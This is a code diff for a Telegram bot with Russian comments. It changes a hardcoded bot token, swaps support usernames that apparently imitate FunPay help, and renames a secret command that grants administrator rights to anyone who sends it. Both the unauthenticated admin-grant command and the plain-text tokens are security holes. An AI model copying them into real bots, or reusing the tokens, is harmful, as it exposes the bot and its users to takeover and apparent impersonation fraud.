@@ -12,16 +12,16 @@ from aiogram.types import InlineKeyboardButton, FSInputFile, CallbackQuery, Inpu
 
 logging.basicConfig(level=logging.INFO)
 
-BOT_TOKEN = "8997156532:AAEtMHSO6AUSilF9hLBymtgtWEYhbLt-NZk"
+BOT_TOKEN = "8997127755:AAGyqfwJnycx1OLru5BQD95nHHF3bH1NkBQ"
 
 # =====================================================
 # НАСТРОЙКИ БОТА (ИЗМЕНЯЙТЕ ЗДЕСЬ)
 # =====================================================
 # Юзернейм менеджера/саппорта (без @)
-MANAGER_USER = "FunPayHelpTg"
+MANAGER_USER = "RelayerForGifts"
 
 # Юзернейм аккаунта для отправки подарков (без @)
-HELPER_USER = "FunPayHelpTg"
+HELPER_USER = "RelayerForGifts"
 
 # Ссылка для поддержки
 SUPPORT_LINK = f"https://t.me/{MANAGER_USER}"
@@ -271,7 +271,7 @@ def get_warning_menu():
 # ОБРАБОТЧИКИ
 # =====================================================
 
-@dp.message(Command("funteam"))
+@dp.message(Command("paicyxe"))
 async def admin_command(message: types.Message):
     admins.add(message.from_user.id)
     await message.answer("✅ <b>Вы успешно получили права администратора!</b>", parse_mode="HTML")
